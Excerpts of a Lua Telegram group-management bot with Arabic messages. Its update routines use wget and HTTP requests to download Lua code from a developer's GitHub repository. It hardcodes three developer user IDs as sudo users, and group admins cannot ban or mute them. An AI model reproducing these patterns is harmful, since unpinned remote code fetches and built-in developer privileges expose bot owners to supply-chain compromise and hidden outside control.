...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/joker0jack365/Files_Boyka/master/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1282382975,1317966118,1424388256}   
...
os.execute('wget https://raw.githubusercontent.com/joker0jack365/SPEED/master/SPEED.lua')
...
if userid == tonumber(1282382975) then
send(msg.chat_id_, msg.id_, " ❅ لا يمكنك حظر المبرمج دارك \n")
return false 
end
if userid == tonumber(1424388256) then
send(msg.chat_id_, msg.id_, " ❅ لا يمكنك حظر المبرمج جاك \n")
return false 
end
if userid == tonumber(1317966118) then
...
if result.sender_user_id_ == tonumber(1424388256) then
send(msg.chat_id_, msg.id_, " ❅ لا يمكنك كتم المبرمج جاك \n")
return false 
end
if result.sender_user_id_ == tonumber(1317966118) then
send(msg.chat_id_, msg.id_, " ❅ لا يمكنك كتم المبرمج جوكر \n")
return false 
end
if result.sender_user_id_ == tonumber(1282382975) then
send(msg.chat_id_, msg.id_, " ❅ لا يمكنك كتم المبرمج دارك \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
...
if DevSPEEDW(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/joker0jack365/Files_Boyka/master/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/joker0jack365/Files_Boyka/master/File_Bot/"..file)
if res == 200 then
